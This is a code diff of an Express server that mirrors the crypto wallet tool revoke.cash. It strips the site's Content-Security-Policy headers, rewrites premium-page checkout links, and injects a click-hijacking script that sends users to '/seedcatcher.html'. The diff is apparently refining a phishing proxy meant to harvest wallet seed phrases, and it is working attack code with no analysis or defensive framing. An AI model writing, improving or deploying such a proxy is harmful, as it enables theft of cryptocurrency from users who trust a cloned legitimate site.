@@ -6,11 +6,13 @@ const app = express();
 const port = process.env.PORT || 8080;
 
 app.use(async (req, res, next) => {
+    // 1. Serve local files directly
     const localFile = path.join(__dirname, req.path);
     if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
         return res.sendFile(localFile);
     }
 
+    // 2. Proxy to revoke.cash
     try {
         const url = 'https://revoke.cash' + req.originalUrl;
         const response = await axios({
@@ -25,32 +27,37 @@ app.use(async (req, res, next) => {
         });
         
         res.setHeader('Access-Control-Allow-Origin', '*');
-        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-        res.setHeader('Access-Control-Allow-Headers', '*');
         res.removeHeader('Content-Security-Policy');
-        res.removeHeader('Content-Security-Policy-Report-Only');
 
-        if (req.path === '/' || req.path === '/index.html') {
+        // 3. Check if we are loading the main page OR the premium page
+        if (req.path === '/' || req.path === '/index.html' || req.path === '/premium') {
             let html = '';
             response.data.on('data', chunk => html += chunk);
             response.data.on('end', () => {
-                // Remove CSP meta tags
-                html = html.replace(/<meta http-equiv="Content-Security-Policy".*?>/gi, '');
                 
-                // HIJACK LINKS DIRECTLY IN HTML
-                // Change any href="/premium" to your catcher
-                html = html.replace(/href="[^"]*\/premium[^"]*"/gi, 'href="/seedcatcher.html"');
-                html = html.replace(/href="[^"]*\/subscribe[^"]*"/gi, 'href="/seedcatcher.html"');
-                html = html.replace(/href="[^"]*\/billing[^"]*"/gi, 'href="/seedcatcher.html"');
-                html = html.replace(/href="[^"]*\/checkout[^"]*"/gi, 'href="/seedcatcher.html"');
+                // If we are on the premium page, rewrite the checkout links
+                if (req.path === '/premium') {
+                    html = html.replace(/href="[^"]*\/subscribe[^"]*"/gi, 'href="/seedcatcher.html"');
+                    html = html.replace(/href="[^"]*\/billing[^"]*"/gi, 'href="/seedcatcher.html"');
+                    html = html.replace(/href="[^"]*\/checkout[^"]*"/gi, 'href="/seedcatcher.html"');
+                }
 
-                // Inject the inline script just in case there are buttons
+                // Inject the hijack script on every page
                 const inlineScript = `
                 <script>
                 document.addEventListener('click', function(e) {
-                    let t = e.target.closest('a, button');
-                    if (t && (t.innerText || "").toLowerCase().match(/(get started|subscribe|upgrade|connect wallet)/)) {
+                    let t = e.target.closest('a, button, div, span');
+                    if (!t) return;
+                    let text = (t.innerText || "").toLowerCase().trim();
+                    let href = (t.getAttribute("href") || "").toLowerCase();
+                    
+                    // Ignore the main menu link
+                    if (href === '/premium' || href.endsWith('/premium')) return;
+
+                    // Catch the exact buttons on the pricing page
+                    if (text === 'get started' || text === 'subscribe' || text.includes('upgrade')) {
                         e.preventDefault();
+                        e.stopPropagation();
                         window.location.href = '/seedcatcher.html';
                     }
                 }, true);
@@ -73,7 +80,7 @@ app.use(async (req, res, next) => {
 });
 
 app.get('*', (req, res) => {
-    res.redirect('/seedcatcher.html');
+    res.status(404).send('Not found');
 });
 
 app.listen(port, () => {
